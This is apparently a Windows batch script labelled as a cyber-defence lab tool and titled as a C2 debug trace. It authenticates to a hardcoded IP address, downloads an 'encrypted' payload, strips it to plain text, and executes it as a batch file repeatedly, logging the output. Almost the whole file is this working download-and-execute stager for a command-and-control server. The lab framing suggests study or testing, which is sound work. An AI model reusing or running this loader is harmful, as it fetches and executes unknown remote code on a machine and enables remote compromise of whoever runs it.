@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul
title C2 VERBOSE.DEBUG.MAX - API→RAW→HEX→CLEAN→PRINT→EXEC
color 0E

echo.
echo ╔══════════════════════════════════════════════════════════════════════╗
echo ║  🕵️‍♂️  C2 VERBOSE.DEBUG.MAX - COMPLETE TRACE 🕵️‍♂️                        ║
echo ║  Alex Montilla - Ciberdefensa Lab vDEBUG.MAX                           ║
echo ╚══════════════════════════════════════════════════════════════════════╝
echo.

set "BASE=http://82.29.153.101:8080"
set "FILE=%TEMP%\sc.bat"
set "RAW=%TEMP%\sc_raw.bin"
set "CLEAN=%TEMP%\sc_clean.bat"
set "LOG=%TEMP%\c2_debug.log"
set "AUTH=%TEMP%\auth.json"

echo 📁 DEBUG FILES:
echo    AUTH:   %AUTH%
echo    RAW:    %RAW%
echo    CLEAN:  %CLEAN%
echo    EXEC:   %FILE%
echo    LOG:    %LOG%
echo.

echo =====================================================
echo 🔍 [1/8] API AUTH - nonce + token
echo =====================================================
echo 📡 REQUEST → %BASE%/auth/key
curl -s --max-time 10 "%BASE%/auth/key" > "%AUTH%"
echo 📄 RESPONSE SIZE:
for %%F in ("%AUTH%") do echo    %%~zF bytes

echo 📄 RAW JSON:
type "%AUTH%"
echo.

echo =====================================================
echo 🔍 [2/8] JSON PARSE - nonce + token
echo =====================================================
powershell -NoProfile -Command ^
  "(Get-Content '%AUTH%' | ConvertFrom-Json).nonce" > "%TEMP%\nonce.txt"
powershell -NoProfile -Command ^
  "(Get-Content '%AUTH%' | ConvertFrom-Json).token" > "%TEMP%\token.txt"

set /p NONCE=<"%TEMP%\nonce.txt"
set /p TOKEN=<"%TEMP%\token.txt"

echo ✓ NONCE:  %NONCE%
echo ✓ TOKEN:  %TOKEN%[!TOKEN:~0,44!]
echo.

echo =====================================================
echo 🔍 [3/8] DOWNLOAD RAW PAYLOAD
echo =====================================================
echo 📡 REQUEST → %BASE%/payload/encrypted
echo 🔑 HEADERS:
echo    X-Nonce: %NONCE%
echo    X-Token: %TOKEN%
curl -s --max-time 10 ^
  -H "X-Nonce: %NONCE%" ^
  -H "X-Token: %TOKEN%" ^
  "%BASE%/payload/encrypted" > "%RAW%"

echo ✓ RAW SIZE:
for %%F in ("%RAW%") do echo    %%~zF bytes
echo.

echo =====================================================
echo 🔍 [4/8] HEX DUMP - PRIMEROS 128 BYTES
echo =====================================================
powershell -NoProfile -Command ^
  "$bytes=[System.IO.File]::ReadAllBytes('%RAW%'); ^
  0..127 | ForEach-Object { if($_ -lt $bytes.Length) { '{0:X2} ' -f $bytes[$_] } else { '..' } } | ^
  Out-Host -Width 200"
echo.

echo =====================================================
echo 🔍 [5/8] ASCII DUMP - CONTENIDO LEGIBLE
echo =====================================================
powershell -NoProfile -Command ^
  "$bytes=[System.IO.File]::ReadAllBytes('%RAW%'); ^
  $text = $bytes | Where-Object {$_ -ge 32 -and $_ -le 126} | ForEach-Object {[char]$_}; ^
  [System.Text.Encoding]::ASCII.GetString($text.ToArray())"
echo.

echo =====================================================
echo 🧹 [6/8] LIMPIEZA AUTOMÁTICA (BOM + INVISIBLES)
echo =====================================================
powershell -NoProfile -Command ^
  "$bytes = [System.IO.File]::ReadAllBytes('%RAW%'); ^
  # Skip BOM (FF FE, EF BB BF, etc) ^
  $start = 0; ^
  if($bytes.Count -gt 1 -and $bytes[0] -eq 0xFF -and $bytes[1] -eq 0xFE) { $start = 2 }; ^
  if($bytes.Count -gt 2 -and $bytes[0] -eq 0xEF -and $bytes[1] -eq 0xBB -and $bytes[2] -eq 0xBF) { $start = 3 }; ^
  # Clean visible ASCII only ^
  $cleanBytes = $bytes[$start..($bytes.Count-1)] | Where-Object { $_ -ge 32 -and $_ -le 126 }; ^
  $content = [System.Text.Encoding]::ASCII.GetString($cleanBytes); ^
  $content | Out-File '%CLEAN%' -Encoding ASCII; ^
  Write-Host ('✓ CLEAN SIZE: ' + $content.Length + ' chars'); ^
  Write-Host '📄 CONTENIDO FINAL LIMPIO:'; ^
  Write-Host $content"

echo.
echo =====================================================
echo 📄 [7/8] CONTENIDO FINAL EN ARCHIVO
echo =====================================================
echo CONTENIDO %CLEAN%:
type "%CLEAN%"
echo.

echo =====================================================
echo 🚀 [8/8] EJECUCIÓN MÚLTIPLE + LOG
echo =====================================================
echo 🔥 TEST 1: call directo
echo --- SALIDA DIRECTA ---
call "%CLEAN%" 2>nul
echo --- FIN TEST 1 ---

echo 🔥 TEST 2: cmd /c con log completo
cmd /c "%CLEAN%" > "%LOG%" 2>&1
echo --- SALIDA LOG ---
type "%LOG%"
echo --- FIN TEST 2 ---

echo.
echo =====================================================
echo ✅ RESUMEN FINAL
echo =====================================================
echo AUTH SIZE:  for %%F in ("%AUTH%") do echo    %%~zF bytes
echo RAW SIZE:   for %%F in ("%RAW%") do echo    %%~zF bytes
echo CLEAN SIZE: for %%F in ("%CLEAN%") do echo    %%~zF bytes
echo LOG:        %LOG%
echo.

echo 🔥 PRESIONA CUALQUIER TECLA PARA REPLAY
pause >nul

echo 🔥 REPLAY EXEC...
call "%CLEAN%"
pause